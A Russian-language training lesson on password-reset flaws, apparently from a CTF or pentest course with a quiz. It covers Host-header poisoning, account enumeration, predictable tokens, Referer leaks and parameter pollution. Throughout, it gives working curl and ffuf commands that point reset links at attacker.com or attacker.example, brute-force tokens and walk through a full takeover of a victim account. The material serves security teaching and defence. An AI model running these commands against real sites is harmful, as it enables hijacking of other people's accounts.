---
id: web-password-reset
title: "Password reset: poisoning, account enumeration, token flaws"
category: web
parent: web-host-header
difficulty: hard
order: 1
tags: [password-reset, host-header, enumeration, token, auth]
prerequisites: [web-host-header]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 38
summary: "Уязвимости сброса пароля: poisoning через Host/X-Forwarded-Host, слабые токены, enumeration, takeover аккаунта."
---

Сброс пароля — критичный функционал, где ошибки ведут к **захвату аккаунта**. Типичные баги: ссылка сброса строится из `Host`-заголовка (poisoning → токен уходит атакующему), токен предсказуем/утекает, форма раскрывает существование аккаунта, токен не истекает и переиспользуется. Этот урок — практический разбор с точными командами.

## Теория: поток сброса и его слабости

Стандартный поток:
1. `POST /forgot` с email.
2. Сервер генерирует токен, шлёт ссылку `https://site/reset?token=XYZ`.
3. Пользователь открывает, задаёт новый пароль.

Слабости на каждом шаге:
- **Шаг 2:** ссылка собирается из `Host`/`X-Forwarded-Host` → poisoning.
- **Токен:** короткий, предсказуемый (время/ID/хеш), утекает в Referer/логах.
- **Шаг 3:** токен не одноразовый, не истекает, привязан только к email (не к сессии).
- **Ответ:** разные сообщения для существующего/несуществующего email → enumeration.

## Атака 1: Host header poisoning

Приложение строит ссылку так: `https://` + `Host` + `/reset?token=...`. Подменяем `Host` на свой:

```bash
curl -s -X POST https://app.example/forgot \
  -H "Host: attacker.com" \
  -d "email=victim@corp.com"
```

Если сервер шлёт письмо со ссылкой `https://attacker.com/reset?token=...`, жертва переходит, и токен попадает к нам. Также пробуем:

```
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Forwarded-For: 1.2.3.4
Forwarded: host=attacker.com
```

Иногда нужен массив/дублирование:
```
Host: attacker.com
Host: app.example
```
(некоторые фреймворки берут первый, некоторые последний).

## Атака 2: account enumeration

Сравниваем ответы для существующего и несуществующего email:

```bash
curl -s -X POST https://app.example/forgot -d "email=exists@corp.com" -o r1.txt
curl -s -X POST https://app.example/forgot -d "email=nobody@corp.com" -o r2.txt
diff r1.txt r2.txt
# разная длина/текст/статус -> enumeration
```

Также смотрим:
- разные HTTP-статусы;
- разное время ответа (существующий email → дольше, т.к. шлётся письмо);
- разные заголовки.

## Атака 3: слабый/предсказуемый токен

- Токен = base64(email) / md5(email) → подделываем.
- Токен = timestamp / sequential ID → перебираем.
- Токен = короткий (4–8 символов) → брут.
- Токен не сбрасывается после использования → переиспользуем.
- Токен не истекает.

```bash
# если токен = md5(email)
python3 -c "import hashlib;print(hashlib.md5(b'victim@corp.com').hexdigest())"
curl -s "https://app.example/reset?token=СГЕНЕРИРОВАННЫЙ"
```

## Атака 4: token в Referer / утечка

Если страница сброса грузит внешние ресурсы (аналитика, CDN), токен из URL уходит в `Referer`:

```
GET /reset?token=XYZ  ->  <img src="https://analytics.evil/">  (Referer: .../reset?token=XYZ)
```

Ищем такие утечки; иногда достаточно добавить свой ресурс на страницу.

## Атака 5: обход подтверждения и takeover

- Смена email без подтверждения старого.
- `POST /reset` принимает `email` и `user_id` → подмена.
- Токен привязан к email, но не к пользователю (если email переиспользуется).
- Ссылка сброса ведёт на страницу, которая сразу показывает новый пароль в URL.

## Разобранный пример: полный takeover

Шаг 1. Проверяем poisoning:

```bash
curl -s -X POST https://app.example/forgot \
  -H "X-Forwarded-Host: attacker.com" -d "email=victim@corp.com"
```

Шаг 2. Жертва получает письмо со ссылкой `https://attacker.com/reset?token=SECRET`.

Шаг 3. Токен у нас. Обмениваем:

```bash
curl -s -X POST https://app.example/reset \
  -d "token=SECRET&new_password=P@ssw0rd!" 
```

Шаг 4. Логинимся как жертва. Аккаунт захвачен.

## Дополнительные векторы

- **Host header injection + cache poisoning** — poisoned-страница кешируется (см. `web-cache-poisoning`).
- **CRLF в Host** → инъекция заголовков.
- **Rate-limit отсутствует** → массовая рассылка/брут токенов.
- **Токен в GET и логируется** — утечка через логи/прокси.
- **Reset для админа через тот же поток** — цель повыше.
- **Email-заголовки** (если email вставляется в `From`/`Subject`) → CRLF-инъекция.

## Инструменты

- **Burp** — менять `Host`/`X-Forwarded-*` автоматически (Host Header Injection Checker).
- **`ffuf`/Intruder** — брут токенов, enumeration.
- **Burp Collaborator** — подтверждение утечки токена на ваш хост.

## Частые ошибки

- **Не проверять X-Forwarded-Host.** Часто проверяют только `Host`, а доверяют `X-Forwarded-*`.
- **Сдаваться после «письмо не пришло».** Меняйте email на свой и смотрите ссылку.
- **Игнорировать enumeration.** Иногда это отдельный (medium) баг.
- **Не проверять одноразовость токена.** Переиспользование = takeover.
- **Забыть про Referer.** Утечка токена — частый баг.
- **Ломать чужие аккаунты.** Используйте свой email для тестов.
- **Путать Host и XFH.** Проверяйте оба.

## Энтропия и предсказуемость токена

Слабый токен сброса — прямой путь к захвату аккаунта. Проверяйте его свойства.

```bash
# 1) запрашиваем несколько токенов и смотрим на структуру
for i in $(seq 1 5); do
  curl -s -X POST https://app.example/forgot -d 'email=a@x.com' >/dev/null
  # токен придёт на почту/в отладку; соберите 5 значений
done
# 2) анализируем: длина, алфавит, есть ли timestamp/id
```

| Признак | Проблема |
|---------|----------|
| Короткий (< 16 символов) | брутфорс |
| Только цифры/hex | сужение перебора |
| Содержит timestamp/uid | предсказуемость |
| Совпадает у разных юзеров | коллизия |
| Не меняется между запросами | фиксированный |
| Живёт долго | широкое окно |

```bash
# перебор 6-значного числового токена через ffuf
ffuf -u 'https://app.example/reset?token=FUZZ' -w <(seq -w 000000 999999) -mc 200 -fs 0
```

## Host header poisoning в сбросе пароля

Ссылка сброса часто строится из `Host`/`X-Forwarded-Host` — и это классическая уязвимость.

```bash
# 1) запрашиваем сброс, подменяя Host
curl -s -X POST https://app.example/forgot \
  -H 'Host: attacker.example' -d 'email=victim@x.com'
# 2) если письмо содержит https://attacker.example/reset?token=... -> утечка токена
# варианты заголовков
curl -s -X POST https://app.example/forgot \
  -H 'X-Forwarded-Host: attacker.example' -d 'email=victim@x.com'
curl -s -X POST https://app.example/forgot \
  -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Host: attacker.example' -d 'email=victim@x.com'
```

Проверяйте все заголовки, влияющие на генерацию URL: `Host`, `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Original-URL`.

## Обход подтверждения и takeover

Иногда можно обойти шаг «подтвердить email» или подменить целевой аккаунт.

```bash
# 1) parameter pollution: два email
curl -s -X POST https://app.example/forgot \
  -d 'email=victim@x.com&email=attacker@evil.com'
# 2) массив
curl -s -X POST https://app.example/forgot \
  -d 'email[]=victim@x.com&email[]=attacker@evil.com'
# 3) смена пользователя после выдачи токена
curl -s -X POST https://app.example/reset -d 'token=VALID&email=attacker@evil.com&pass=new'
```

Проверяйте: привязан ли токен к конкретному пользователю; можно ли использовать токен после смены email; обнуляется ли токен после первого использования.

## Ответ-манипуляция и race

```bash
# подмена ответа сервера (если клиент доверяет телу)
# в Burp: заменить {"success":false} на {"success":true}
# гонка: два одновременных запроса на использование токена
curl -s 'https://app.example/reset?token=T&pass=a' & \
curl -s 'https://app.example/reset?token=T&pass=b' & wait
# если оба прошли -> токен не одноразовый
```

## Полный чек-лист

| Проверка | Что ищем |
|----------|----------|
| Энтропия | длина/алфавит токена |
| Срок жизни | слишком долгий |
| Одноразовость | повторное использование |
| Привязка к юзеру | смена email/uid |
| Host-заголовки | подмена ссылки |
| Enumeration | разные ответы на существующий/нет email |
| Утечка | Referer, лог, кэш |
| Rate-limit | перебор токенов |

## Инструменты

```bash
# анализ энтропии токенов
python3 - <<'PY'
import math
from collections import Counter
toks = open('tokens.txt').read().split()
for t in toks:
    print(len(t), len(set(t)), -sum(c/len(t)*math.log2(c/len(t)) for c in Counter(t).values()))
PY
# ffuf — перебор токенов
ffuf -u 'https://app.example/reset?token=FUZZ' -w tokens.txt -mc 200
```

## Что делать дальше / решение

1. **Соберите токены.** Оцените энтропию и структуру.
2. **Проверьте Host-заголовки.** Подмена ссылки сброса.
3. **Проверьте привязку.** Смена email/uid после выдачи.
4. **Проверьте одноразовость.** Повторное использование, гонка.
5. **Проверьте enumeration.** Разные ответы на email.
6. **Зафиксируйте PoC.** Токен + захваченный аккаунт.

## Практика и справочники

- **PortSwigger Academy** — «Password reset broken logic».
- **HackTricks** — «Reset password».
- **OWASP WSTG** — `WSTG-ATHN-09`.
- **PayloadsAllTheThings** — «Account Takeover».

## Приоритеты при сбросе пароля

Проверяйте поток сброса по четырём осям: (1) генерация ссылки — Host-заголовки и утечка токена; (2) сам токен — энтропия, срок жизни, одноразовость, привязка к пользователю; (3) логика — можно ли подменить целевой аккаунт, обойти подтверждение, использовать токен дважды; (4) разведка — различаются ли ответы для существующего и несуществующего email. Любая слабость в токене или в привязке даёт полный захват аккаунта, поэтому сброс пароля — один из самых ценных векторов.

## Кратко

1. Host-заголовки → утечка ссылки.
2. Энтропия/срок/одноразовость токена.
3. Привязка к пользователю.
4. Enumeration и rate-limit.
5. Гонка и повторное использование.
6. PoC — захват чужого аккаунта.

## Практика

- **PortSwigger Academy** — password reset broken logic.
- **HackTricks** — reset password.
- **OWASP WSTG** — `WSTG-ATHN-09`.

## Расширенный разбор: цепочка захвата

```text
1) enumeration: отличаем существующий email от несуществующего
2) запрашиваем сброс с подменённым Host -> ссылка с токеном на attacker
3) либо подбираем слабый токен
4) используем токен с чужим email (parameter pollution)
5) получаем доступ к аккаунту жертвы
```

```bash
# шаг 1: enumeration
curl -s -X POST https://app.example/forgot -d 'email=exists@x.com' -w '\n%{size_download}\n'
curl -s -X POST https://app.example/forgot -d 'email=no@x.com' -w '\n%{size_download}\n'
# разный размер/текст -> enumeration
```

## Дополнительно: где искать токен

Токен сброса утекает не только в письме: через `Referer` (если ссылка на сторонний ресурс), через кэш (если ответ кэшируется), через логи, через заголовок `Location` при редиректе. Проверяйте, не остаётся ли токен в URL после использования (история браузера, shared-ссылки) и не попадает ли он в сторонние аналитические сервисы.

## Квиз

```quiz
- question: "Как Host header poisoning приводит к захвату аккаунта?"
  options:
    - "Меняет пароль напрямую"
    - "Ссылка сброса в письме строится из Host и ведёт на домен атакующего с токеном"
    - "Отключает TLS"
    - "Блокирует email"
  answer: 1
  explanation: "Жертва переходит по нашей ссылке, токен утекает."
- question: "Какой заголовок чаще всего тоже влияет на построение ссылки?"
  options:
    - "X-Forwarded-Host"
    - "User-Agent"
    - "Accept-Language"
    - "Referer"
  answer: 0
  explanation: "Прокси/фреймворки нередко доверяют X-Forwarded-Host."
- question: "Как обнаружить account enumeration?"
  options:
    - "По цвету страницы"
    - "Сравнить ответы (статус/длина/время) для существующего и несуществующего email"
    - "По размеру cookie"
    - "По TLS-сертификату"
  answer: 1
  explanation: "Различия в ответе раскрывают существование аккаунта."
- question: "Почему опасен предсказуемый токен сброса?"
  options:
    - "Он длинный"
    - "Его можно вычислить/перебрать и сбросить пароль жертвы"
    - "Он истекает"
    - "Он шифруется"
  answer: 1
  explanation: "md5(email), timestamp, sequential — всё это предсказуемо."
- question: "Как токен может утечь через Referer?"
  options:
    - "Он в cookie"
    - "Страница с токеном в URL грузит внешний ресурс, передавая Referer"
    - "Он в POST-теле"
    - "Он в заголовке Host"
  answer: 1
  explanation: "Внешние ресурсы получают URL с токеном в Referer."
```

## Где пригодится

- **CTF (Web):** задачи на захват аккаунта через сброс.
- **Bug bounty:** host poisoning и token flaws — критичные отчёты.
- **Пентест:** аудит потоков восстановления доступа.
- **Работа (AppSec):** жёсткий allowlist для Host, криптостойкие одноразовые токены, единый ответ при enumeration.
